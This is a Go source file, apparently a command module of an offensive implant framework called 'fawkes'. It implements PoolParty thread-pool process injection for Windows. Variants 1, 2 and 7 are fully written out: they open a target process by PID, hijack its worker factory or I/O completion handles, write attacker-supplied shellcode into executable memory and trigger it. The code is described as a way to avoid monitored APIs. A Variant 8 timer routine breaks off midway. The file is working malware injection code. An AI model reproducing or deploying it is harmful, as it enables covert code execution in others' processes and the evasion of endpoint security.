//go:build windows
// +build windows

// Package commands provides the poolparty-injection command for Thread Pool-based process injection.
//
// This command implements PoolParty injection techniques based on SafeBreach Labs research.
// Currently supported variants:
//   - Variant 1: Worker Factory Start Routine Overwrite
//   - Variant 2: TP_WORK Insertion
//   - Variant 7: TP_DIRECT Insertion (via I/O Completion Port)
//
// These techniques abuse Windows Thread Pool internals to achieve code execution
// without calling CreateRemoteThread or similar monitored APIs.
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolParty-specific constants
const (
	// Process access rights
	PROCESS_DUP_HANDLE = 0x0040

	// Worker factory access rights
	WORKER_FACTORY_RELEASE_WORKER    = 0x0001
	WORKER_FACTORY_WAIT              = 0x0002
	WORKER_FACTORY_SET_INFORMATION   = 0x0004
	WORKER_FACTORY_QUERY_INFORMATION = 0x0008
	WORKER_FACTORY_READY_WORKER      = 0x0010
	WORKER_FACTORY_SHUTDOWN          = 0x0020
	WORKER_FACTORY_ALL_ACCESS        = windows.STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_RELEASE_WORKER | WORKER_FACTORY_WAIT | WORKER_FACTORY_SET_INFORMATION | WORKER_FACTORY_QUERY_INFORMATION | WORKER_FACTORY_READY_WORKER | WORKER_FACTORY_SHUTDOWN

	// I/O Completion access rights
	IO_COMPLETION_QUERY_STATE  = 0x0001
	IO_COMPLETION_MODIFY_STATE = 0x0002
	IO_COMPLETION_ALL_ACCESS   = windows.STANDARD_RIGHTS_REQUIRED | IO_COMPLETION_QUERY_STATE | IO_COMPLETION_MODIFY_STATE

	// Worker factory info classes
	WorkerFactoryBasicInformation = 7
	WorkerFactoryThreadMinimum    = 4

	// Process info class for handle enumeration
	ProcessHandleInformation = 51

	// Object info class
	ObjectTypeInformation = 2

	// Thread pool callback priorities
	TP_CALLBACK_PRIORITY_HIGH   = 0
	TP_CALLBACK_PRIORITY_NORMAL = 1
	TP_CALLBACK_PRIORITY_LOW    = 2

	// Memory protection (PAGE_READWRITE is in vanillainjection.go)
	PAGE_EXECUTE_READWRITE = 0x40
)

// WORKER_FACTORY_BASIC_INFORMATION structure
type WORKER_FACTORY_BASIC_INFORMATION struct {
	Timeout                  int64
	RetryTimeout             int64
	IdleTimeout              int64
	Paused                   uint8
	TimerSet                 uint8
	QueuedToExWorker         uint8
	MayCreate                uint8
	CreateInProgress         uint8
	InsertedIntoQueue        uint8
	Shutdown                 uint8
	_                        uint8 // padding
	BindingCount             uint32
	ThreadMinimum            uint32
	ThreadMaximum            uint32
	PendingWorkerCount       uint32
	WaitingWorkerCount       uint32
	TotalWorkerCount         uint32
	ReleaseCount             uint32
	InfiniteWaitGoal         int64
	StartRoutine             uintptr
	StartParameter           uintptr
	ProcessId                windows.Handle
	StackReserve             uintptr
	StackCommit              uintptr
	LastThreadCreationStatus int32
	_                        [4]byte // padding
}

// PROCESS_HANDLE_TABLE_ENTRY_INFO structure
type PROCESS_HANDLE_TABLE_ENTRY_INFO struct {
	HandleValue      windows.Handle
	HandleCount      uintptr
	PointerCount     uintptr
	GrantedAccess    uint32
	ObjectTypeIndex  uint32
	HandleAttributes uint32
	Reserved         uint32
}

// PROCESS_HANDLE_SNAPSHOT_INFORMATION structure (variable size)
type PROCESS_HANDLE_SNAPSHOT_INFORMATION struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	// Handles array follows
}

// PUBLIC_OBJECT_TYPE_INFORMATION structure
type PUBLIC_OBJECT_TYPE_INFORMATION struct {
	TypeName windows.NTUnicodeString
	Reserved [22]uint32
}

// LIST_ENTRY structure
type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

// TP_TASK_CALLBACKS structure
type TP_TASK_CALLBACKS struct {
	ExecuteCallback uintptr
	Unposted        uintptr
}

// TP_TASK structure
type TP_TASK struct {
	Callbacks      uintptr // Pointer to TP_TASK_CALLBACKS
	NumaNode       uint32
	IdealProcessor uint8
	_              [3]byte
	ListEntry      LIST_ENTRY
}

// TP_DIRECT structure - used for variant 7
type TP_DIRECT struct {
	Task                        TP_TASK
	Lock                        uint64
	IoCompletionInformationList LIST_ENTRY
	Callback                    uintptr
	NumaNode                    uint32
	IdealProcessor              uint8
	_                           [3]byte
}

// TPP_WORK_STATE union (represented as uint32)
type TPP_WORK_STATE struct {
	Exchange uint32
}

// Simplified TPP_CLEANUP_GROUP_MEMBER - only the fields we need
type TPP_CLEANUP_GROUP_MEMBER struct {
	_                  [8]byte   // Refcount
	_                  [8]byte   // padding
	VFuncs             uintptr   // VFuncs pointer
	CleanupGroup       uintptr   // CleanupGroup pointer
	CleanupGroupCancel uintptr   // CleanupGroupCancelCallback
	Finalization       uintptr   // FinalizationCallback
	CleanupGroupLinks  LIST_ENTRY // CleanupGroupMemberLinks
	_                  [64]byte  // CallbackBarrier
	Callback           uintptr   // Union of various callbacks
	Context            uintptr
	ActivationContext  uintptr
	SubProcessTag      uintptr
	ActivityId         [16]byte  // GUID
	WorkOnBehalfTicket [8]byte   // ALPC ticket
	RaceDll            uintptr
	Pool               uintptr   // Pointer to FULL_TP_POOL
	PoolObjectLinks    LIST_ENTRY
	Flags              uint32    // Union flags/longfunction/etc
	_                  [4]byte   // padding
	_                  [16]byte  // AllocCaller
	_                  [16]byte  // ReleaseCaller
	CallbackPriority   int32
	_                  [4]byte   // padding
}

// FULL_TP_WORK structure
type FULL_TP_WORK struct {
	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
	Task               TP_TASK
	WorkState          TPP_WORK_STATE
	_                  [4]byte // padding
}

// TPP_QUEUE structure (simplified)
type TPP_QUEUE struct {
	Queue LIST_ENTRY
	_     [40]byte // RTL_SRWLOCK and other fields
}

// FULL_TP_POOL structure (simplified - only fields we need)
type FULL_TP_POOL struct {
	_          [16]byte     // Refcount and padding
	_          [8]byte      // QueueState
	TaskQueue  [3]uintptr   // Array of pointers to TPP_QUEUE
	_          [8]byte      // NumaNode pointer
	_          [8]byte      // ProximityInfo pointer
	_          [8]byte      // WorkerFactory pointer
	_          [8]byte      // CompletionPort pointer
	_          [40]byte     // Lock (RTL_SRWLOCK)
	_          [16]byte     // PoolObjectList
	_          [16]byte     // WorkerList
	TimerQueue TPP_TIMER_QUEUE
	// Rest omitted - we only need TimerQueue
}

// TPP_PH structure
type TPP_PH struct {
	Root uintptr
}

// TPP_PH_LINKS structure
type TPP_PH_LINKS struct {
	Siblings LIST_ENTRY
	Children LIST_ENTRY
	Key      int64
}

// TPP_TIMER_SUBQUEUE structure
type TPP_TIMER_SUBQUEUE struct {
	Expiration       int64
	WindowStart      TPP_PH
	WindowEnd        TPP_PH
	Timer            uintptr
	TimerPkt         uintptr
	Direct           TP_DIRECT
	ExpirationWindow uint32
	_                [4]byte // padding
}

// TPP_TIMER_QUEUE structure
type TPP_TIMER_QUEUE struct {
	_                [40]byte // Lock (RTL_SRWLOCK)
	AbsoluteQueue    TPP_TIMER_SUBQUEUE
	RelativeQueue    TPP_TIMER_SUBQUEUE
	AllocatedTimerCount int32
	_                [4]byte // padding
}

// FULL_TP_TIMER structure
type FULL_TP_TIMER struct {
	Work             FULL_TP_WORK
	_                [40]byte // Lock (RTL_SRWLOCK)
	WindowEndLinks   TPP_PH_LINKS
	WindowStartLinks TPP_PH_LINKS
	DueTime          int64
	_                [64]byte // Ite structure
	Window           uint32
	Period           uint32
	Inserted         uint8
	WaitTimer        uint8
	TimerStatus      uint8
	BlockInsert      uint8
	_                [4]byte // padding
}

// T2_SET_PARAMETERS structure for NtSetTimer2
type T2_SET_PARAMETERS struct {
	_      [96]byte // Full structure is complex, we only need to pass zeros
}

// NT API procedures
var (
	ntdll                                 = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationWorkerFactory   = ntdll.NewProc("NtQueryInformationWorkerFactory")
	procNtSetInformationWorkerFactory     = ntdll.NewProc("NtSetInformationWorkerFactory")
	procNtQueryInformationProcess         = ntdll.NewProc("NtQueryInformationProcess")
	procNtQueryObject                     = ntdll.NewProc("NtQueryObject")
	procZwSetIoCompletion                 = ntdll.NewProc("ZwSetIoCompletion")
	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
	procNtSetTimer2                       = ntdll.NewProc("NtSetTimer2")
	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
	procCloseThreadpoolWork               = kernel32.NewProc("CloseThreadpoolWork")
	procCreateThreadpoolTimer             = kernel32.NewProc("CreateThreadpoolTimer")
	procCloseThreadpoolTimer              = kernel32.NewProc("CloseThreadpoolTimer")
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 2:
		output, err = executeVariant2(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	case 8:
		output, err = executeVariant8(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartRoutine,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant2 implements TP_WORK Insertion
func executeVariant2(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 4: Read target process's TP_POOL structure
	var targetTpPool FULL_TP_POOL
	var bytesRead uintptr
	ret, _, err := procReadProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartParameter,
		uintptr(unsafe.Pointer(&targetTpPool)),
		uintptr(unsafe.Sizeof(targetTpPool)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
	}
	output += "[+] Read target process's TP_POOL structure\n"

	// Step 5: Get high priority task queue address
	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
		return output, fmt.Errorf("high priority task queue is NULL")
	}

	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
	var targetQueue TPP_QUEUE
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH],
		uintptr(unsafe.Pointer(&targetQueue)),
		uintptr(unsafe.Sizeof(targetQueue)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
	}
	output += "[+] Read target process's task queue structure\n"

	// Step 6: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 7: Write shellcode
	var bytesWritten uintptr
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
	pTpWork, _, err := procCreateThreadpoolWork.Call(
		shellcodeAddr, // Work callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWork == 0 {
		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
	}
	output += "[+] Created TP_WORK structure associated with shellcode\n"

	// Step 9: Read and modify the TP_WORK structure
	var tpWork FULL_TP_WORK
	// Copy the structure from our local process
	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
	}
	
	// Close the local TP_WORK now that we've copied it
	procCloseThreadpoolWork.Call(pTpWork)

	// Modify: Point Pool to target's TP_POOL
	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
	
	// Modify: Point Flink and Blink to the Queue field address in the target process
	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
	// We need the address of the Queue field within that TPP_QUEUE
	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
	
	// Read current queue state before modifying
	var currentQueueFlink, currentQueueBlink uintptr
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr,
		uintptr(unsafe.Pointer(&currentQueueFlink)),
		uintptr(unsafe.Sizeof(currentQueueFlink)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
	}
	
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr+8,
		uintptr(unsafe.Pointer(&currentQueueBlink)),
		uintptr(unsafe.Sizeof(currentQueueBlink)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
	}
	
	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
	
	// If queue is empty (points to itself), simple circular list
	// If queue has items, insert at head
	if currentQueueFlink == targetQueueListAddr {
		output += "[*] Queue is empty, creating single-element list\n"
		tpWork.Task.ListEntry.Flink = targetQueueListAddr
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	} else {
		output += "[*] Queue has existing items, inserting at head\n"
		tpWork.Task.ListEntry.Flink = currentQueueFlink
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	}
	
	// Set WorkState exactly as SafeBreach does
	tpWork.WorkState.Exchange = 0x2
	output += "[+] Modified TP_WORK structure for insertion\n"

	// Step 10: Allocate memory for TP_WORK in target process
	tpWorkAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpWorkAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)

	// Step 11: Write TP_WORK to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpWorkAddr,
		uintptr(unsafe.Pointer(&tpWork)),
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)

	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
	
	// Recalculate queue addresses (can't use := since variables already declared)
	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
	
	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
	
	// Update queue's Flink to point to our TP_WORK
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr,
		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
	}
	
	// Update queue's Blink based on whether queue was empty
	var blinkTarget uintptr
	if currentQueueFlink == targetQueueListAddr {
		// Queue was empty, so Blink also points to our work item
		blinkTarget = remoteWorkItemTaskListAddr
	} else {
		// Queue had items, need to update the old first item's Blink to point to us
		// and queue's Blink stays pointing to the last item
		// Actually, for simplicity, SafeBreach just sets both to the new item
		blinkTarget = remoteWorkItemTaskListAddr
	}
	
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))),
		uintptr(unsafe.Pointer(&blinkTarget)),
		uintptr(unsafe.Sizeof(blinkTarget)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
	}
	
	// If there was an existing first item, update its Blink to point to our work item
	if currentQueueFlink != targetQueueListAddr {
		// Calculate the Blink address of the old first item
		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
		oldFirstItemBlinkAddr := currentQueueFlink + 8
		ret, _, err = procWriteProcessMemory.Call(
			uintptr(hProcess),
			oldFirstItemBlinkAddr,
			uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
			uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
			uintptr(unsafe.Pointer(&bytesWritten)),
		)
		if ret == 0 {
			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
		}
		output += "[*] Updated old first item's Blink pointer\n"
	}
	
	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
	output += "[+] PoolParty Variant 2 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	output += "[+] Crafted TP_DIRECT structure with shellcode callback\n"

	// Step 6: Allocate memory for TP_DIRECT in target process
	tpDirectAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpDirectAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	// Step 7: Write TP_DIRECT to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpDirectAddr,
		uintptr(unsafe.Pointer(&tpDirect)),
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_DIRECT structure (%d bytes)\n", bytesWritten)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// executeVariant8 implements TP_TIMER Insertion - Variant 8
func executeVariant8(shellcode []byte, pid uint32) (string, error) {
	var output string
	output = fmt.Sprintf("[*] PoolParty Variant 8: TP_TIMER Insertion\n")
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack worker factory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Hijack IR timer handle
	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack timer handle: %v", err)
	}
	defer windows.CloseHandle(hTimer)
